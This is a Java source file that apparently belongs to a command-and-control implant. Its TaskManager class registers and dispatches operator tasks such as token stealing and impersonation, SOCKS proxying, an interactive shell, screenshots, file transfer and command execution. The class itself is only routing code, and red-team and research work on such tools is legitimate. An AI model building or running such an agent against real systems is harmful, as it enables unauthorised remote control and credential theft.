package com.woopsie;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.tasks.*;

import java.util.HashMap;
import java.util.Map;

/**
 * Manages task execution with proper task routing
 */
public class TaskManager {
    
    private final Config config;
    private final Map<String, Task> taskHandlers;
    private final ObjectMapper objectMapper;
    private final ExitTask exitTask;
    
    public TaskManager(Config config) {
        this.config = config;
        this.taskHandlers = new HashMap<>();
        this.objectMapper = new ObjectMapper();
        this.exitTask = new ExitTask();
        registerDefaultTasks();
    }
    
    private void registerDefaultTasks() {
        // Register built-in task handlers
        registerTask(new PwdTask());
        registerTask(new CdTask());
        registerTask(new LsTask());
        registerTask(new RunTask());
        registerTask(new DownloadTask());
        registerTask(new UploadTask());
        registerTask(new PsTask());
        registerTask(new CatTask());
        registerTask(new WhoamiTask());
        registerTask(new RmTask());
        registerTask(new CpTask());
        registerTask(new MkdirTask());
        registerTask(new SleepTask());
        registerTask(new SocksTask());
        registerTask(new PtyTask());
        registerTask(new StealTokenTask());
        registerTask(new Rev2SelfTask());
        registerTask(new MakeTokenTask());
        registerTask(new ScreenshotTask());
        registerTask(exitTask);
    }
    
    private void registerTask(Task task) {
        taskHandlers.put(task.getCommandName(), task);
    }
    
    public boolean shouldExit() {
        return exitTask.shouldExit();
    }
    
    /**
     * Execute a task with proper parameter parsing
     * @param command Command name
     * @param parametersJson Parameters as JSON string
     * @return Task output
     */
    public String executeTask(String command, String parametersJson) {
        Config.debugLog(config, "=== EXECUTING TASK ===");
        Config.debugLog(config, "Command: " + command);
        Config.debugLog(config, "Parameters: " + parametersJson);
        
        Task task = taskHandlers.get(command);
        if (task == null) {
            Config.debugLog(config, "Unknown command: " + command);
            return "Unknown command: " + command;
        }
        
        try {
            // Parse parameters JSON
            JsonNode parameters = null;
            if (parametersJson != null && !parametersJson.isEmpty()) {
                parameters = objectMapper.readTree(parametersJson);
            }
            
            // Execute task
            String result = task.execute(config, parameters);
            Config.debugLog(config, "Task result length: " + result.length() + " bytes");
            return result;
            
        } catch (Exception e) {
            Config.debugLog(config, "Task execution failed: " + e.getMessage());
            if (config.isDebug()) {
                e.printStackTrace();
            }
            return "Error: " + e.getMessage();
        }
    }
}
